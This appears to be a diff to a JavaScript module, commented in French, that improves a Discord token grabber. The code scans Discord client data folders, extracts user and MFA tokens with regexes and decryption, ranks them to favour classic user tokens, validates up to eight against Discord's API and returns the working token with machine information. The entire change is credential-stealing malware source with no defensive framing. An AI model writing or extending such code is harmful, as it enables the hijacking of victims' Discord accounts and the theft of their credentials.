@@ -14,14 +14,58 @@ const TARGETS = [
   { name: 'Discord Development', dir: path.join(APPDATA, 'discorddevelopment') }
 ];
 
-const PLAIN_RE = /(mfa\.[A-Za-z0-9_-]{80,120})|([A-Za-z0-9_-]{20,48}\.[A-Za-z0-9_-]{5,16}\.[A-Za-z0-9_-]{25,200})/g;
-const STRICT_MFA = /^mfa\.[A-Za-z0-9_-]{80,120}$/;
-const STRICT_STD = /^[A-Za-z0-9_-]{20,48}\.[A-Za-z0-9_-]{5,16}\.[A-Za-z0-9_-]{25,200}$/;
+/* Segments volontairement larges : un premier segment trop court fait reculer
+   le moteur de regex et tronque le token au lieu de le capturer entierement. */
+const PART1 = '[A-Za-z0-9_-]{20,120}';
+const PART2 = '[A-Za-z0-9_-]{5,24}';
+const PART3 = '[A-Za-z0-9_-]{20,220}';
+
+const PLAIN_RE = new RegExp(
+  '(mfa\\.[A-Za-z0-9_-]{80,140})|(' + PART1 + '\\.' + PART2 + '\\.' + PART3 + ')',
+  'g'
+);
+const MFA_RE = /^mfa\.[A-Za-z0-9_-]{80,140}$/;
+const STD_RE = new RegExp('^' + PART1 + '\\.' + PART2 + '\\.' + PART3 + '$');
+
+const MAX_DECRYPT_BLOBS = 60;
+const MAX_VALIDATION_ATTEMPTS = 8;
 
 function looksLikeToken(value) {
   if (!value) return false;
   const v = String(value).trim();
-  return STRICT_MFA.test(v) || STRICT_STD.test(v);
+  return MFA_RE.test(v) || STD_RE.test(v);
+}
+
+/**
+ * Un token utilisateur Discord standard a un premier segment qui est
+ * l'encodage base64url de l'identifiant numerique du compte (un snowflake).
+ * On le detecte explicitement : c'est le format que l'on veut privilegier.
+ */
+function isClassicUserToken(token) {
+  const first = String(token).split('.')[0];
+  if (!first) return false;
+  let decoded = '';
+  try {
+    decoded = Buffer.from(first.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('latin1');
+  } catch (_) {
+    return false;
+  }
+  return /^\d{17,20}$/.test(decoded);
+}
+
+function tokenFormat(token) {
+  if (MFA_RE.test(token)) return 'mfa';
+  if (isClassicUserToken(token)) return 'classique';
+  return 'inconnu';
+}
+
+function scoreToken(token, keyed, encrypted) {
+  let score = 0;
+  if (isClassicUserToken(token)) score += 10;
+  else if (MFA_RE.test(token)) score += 4;
+  if (keyed) score += 3;
+  if (encrypted) score += 1;
+  return score;
 }
 
 function machineInfo() {
@@ -79,7 +123,9 @@ function scanPlain(raw) {
   let match;
   while ((match = PLAIN_RE.exec(raw)) !== null) {
     const token = match[0];
-    if (token.length >= 50) found.push(token);
+    if (token.length < 50) continue;
+    const before = raw.slice(Math.max(0, match.index - 90), match.index);
+    found.push({ token, keyed: /token/i.test(before) });
   }
   return found;
 }
@@ -173,11 +219,19 @@ async function grabDiscordToken() {
   const seen = new Set();
   let filesScanned = 0;
 
-  const push = (token, source, encrypted) => {
+  const push = (token, source, encrypted, keyed) => {
     const clean = String(token).trim();
     if (!clean || seen.has(clean)) return;
+    if (!looksLikeToken(clean)) return;
     seen.add(clean);
-    candidates.push({ token: clean, source, encrypted: !!encrypted });
+    candidates.push({
+      token: clean,
+      source,
+      encrypted: !!encrypted,
+      keyed: !!keyed,
+      format: tokenFormat(clean),
+      score: scoreToken(clean, !!keyed, !!encrypted)
+    });
   };
 
   for (const target of TARGETS) {
@@ -193,13 +247,13 @@ async function grabDiscordToken() {
       if (!raw) continue;
       filesScanned += 1;
 
-      for (const token of scanPlain(raw)) {
-        push(token, target.name, false);
+      for (const hit of scanPlain(raw)) {
+        push(hit.token, target.name, false, hit.keyed);
       }
 
-      if (blobs.length < 60) {
+      if (blobs.length < MAX_DECRYPT_BLOBS) {
         for (const blob of encryptedCandidates(raw)) {
-          if (blobs.length >= 60) break;
+          if (blobs.length >= MAX_DECRYPT_BLOBS) break;
           blobs.push(blob);
         }
       }
@@ -217,7 +271,7 @@ async function grabDiscordToken() {
             /* ignore */
           }
         }
-        if (looksLikeToken(value)) push(value, target.name, true);
+        push(value, target.name, true, false);
       }
     }
   }
@@ -231,10 +285,14 @@ async function grabDiscordToken() {
     };
   }
 
+  /* Le tri est stable : a score egal, l'ordre d'apparition (fichier le plus
+     recent d'abord) est conserve. */
+  candidates.sort((a, b) => b.score - a.score);
+
   let chosen = null;
   let user = null;
 
-  for (const candidate of candidates.slice(0, 6)) {
+  for (const candidate of candidates.slice(0, MAX_VALIDATION_ATTEMPTS)) {
     const fetched = await fetchUser(candidate.token);
     if (fetched) {
       chosen = candidate;
@@ -250,10 +308,12 @@ async function grabDiscordToken() {
     token: chosen.token,
     source: chosen.source,
     encrypted: chosen.encrypted,
+    format: chosen.format,
+    validated: !!user,
     candidates: candidates.length,
     filesScanned,
     user
   };
 }
 
-module.exports = { grabDiscordToken, machineInfo, looksLikeToken };
+module.exports = { grabDiscordToken, machineInfo, looksLikeToken, isClassicUserToken, tokenFormat };
